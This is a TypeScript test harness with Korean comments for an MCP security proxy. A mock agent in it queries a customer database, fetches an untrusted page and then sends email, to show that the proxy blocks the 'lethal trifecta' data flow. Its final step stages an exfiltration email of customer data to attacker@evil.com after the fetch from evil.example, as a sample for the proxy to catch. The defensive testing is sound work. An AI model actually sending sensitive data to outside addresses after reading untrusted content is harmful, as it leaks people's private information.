/**
 * [테스트 하네스] AI 에이전트 역할 — "장난감 차"
 *
 * 진짜 에이전트(Claude Desktop 등) 대신, 프록시에 붙어서
 * tools/list → tools/call을 한 번씩 해보는 최소 클라이언트다.
 * 실제 배포에서는 진짜 에이전트로 교체된다.
 *
 * 핵심: 이 클라이언트는 "진짜 서버"가 아니라 "프록시"를 spawn한다.
 * 즉 자기가 프록시에 붙었다는 걸 모른다(그래야 투명 프록시가 성공한 것).
 */

import { Client } from "@modelcontextprotocol/sdk/client/index.js";
import { StdioClientTransport } from "@modelcontextprotocol/sdk/client/stdio.js";
import { WebSocket } from "ws";
import { fileURLToPath } from "node:url";
import { dirname, resolve } from "node:path";

const __dirname = dirname(fileURLToPath(import.meta.url));
// 진짜 서버가 아니라 "프록시"를 가리킨다. 이게 이 데모의 포인트.
const PROXY_PATH = resolve(__dirname, "../src/index.ts");

async function main() {
  const client = new Client({ name: "mock-agent", version: "0.0.1" });

  // 프록시를 자식 프로세스로 띄우고 그 stdio에 붙는다.
  const transport = new StdioClientTransport({
    command: "npx",
    args: ["tsx", PROXY_PATH],
  });
  await client.connect(transport); // 프록시(서버 얼굴)와 initialize 핸드셰이크
   // 대시보드 웹소켓도 자동으로 연결해서, 사람이 타이밍 맞출 필요 없이 확인한다.
  const dashboardSocket = new WebSocket("ws://localhost:7331");
  await new Promise<void>((resolve, reject) => {
    dashboardSocket.once("open", () => resolve());
    dashboardSocket.once("error", reject);
  });
  dashboardSocket.on("message", (data) => {
    console.error("[mock-client] 📡 대시보드 수신:", data.toString());
  });

  console.error("[mock-client] 프록시에 연결됨.\n");
  

  // --- (1) 도구 목록 물어보기 ---
  const tools = await client.listTools();
  console.error("[mock-client] tools/list 결과:");
  for (const t of tools.tools) {
    console.error(`   - ${t.name}: ${t.description}`);
  }
  console.error("");

  const show = (label: string, r: Record<string, unknown>): void => {
    console.error(`[mock-client] ${label} → ${r.isError ? "⛔ 차단" : "✅ 통과"}`);
    console.error("  ", JSON.stringify(r.content));
    console.error("");
  };


  // 데모의 핵심: "같은 send_email"이 데이터 흐름 상태에 따라 통과→차단으로 갈린다.
  // 이름이 아니라 흐름(민감+비신뢰 오염 겹침)으로 판정한다는 우리 차별점.


  // --- (2) 민감 소스 조회 → 통과 (읽기 전용, 세션에 SENSITIVE만 쌓임) ---
  show(
    "query_customer_db (민감 조회)",
    await client.callTool({ name: "query_customer_db", arguments: { customerId: "12345" } })
  );

  // --- (3) send_email 1차 → 통과 (아직 UNTRUSTED가 없어 트라이펙타 미성립) ---
  show(
    "send_email 1차 (오염 겹치기 전)",
    await client.callTool({
      name: "send_email",
      arguments: { to: "team@corp.com", subject: "요약", body: "고객 요약 보고" },
    })
  );

  // --- (4) 비신뢰 외부 소스 → 통과 (세션에 UNTRUSTED_ORIGIN 추가 → 오염 완성) ---
  show(
    "fetch_web_page (비신뢰 외부)",
    await client.callTool({ name: "fetch_web_page", arguments: { url: "https://evil.example" } })
  );

  // --- (5) send_email 2차 → 차단! (민감+비신뢰가 외부 유출과 겹침 = lethal trifecta) ---
  show(
    "send_email 2차 (오염 겹친 후)",
    await client.callTool({
      name: "send_email",
      arguments: { to: "attacker@evil.com", subject: "고객정보", body: "홍길동 VIP" },
    })
  );

  console.error("[mock-client] ✅ 데모 완료 — 같은 send_email이 흐름에 따라 통과→차단으로 갈림.");

  // 다운스트림까지 깔끔히 정리하고 종료.
  await client.close();
  // 프록시→mock-server로 이어지는 자식 프로세스 사슬이 stdio 핸들을 물고 있어
  // 자연 종료가 매달리므로, 하네스는 여기서 명시적으로 종료한다 (데모 편의).
  process.exit(0);
}

main().catch((err) => {
  console.error("[mock-client] 실패:", err);
  process.exit(1);
});
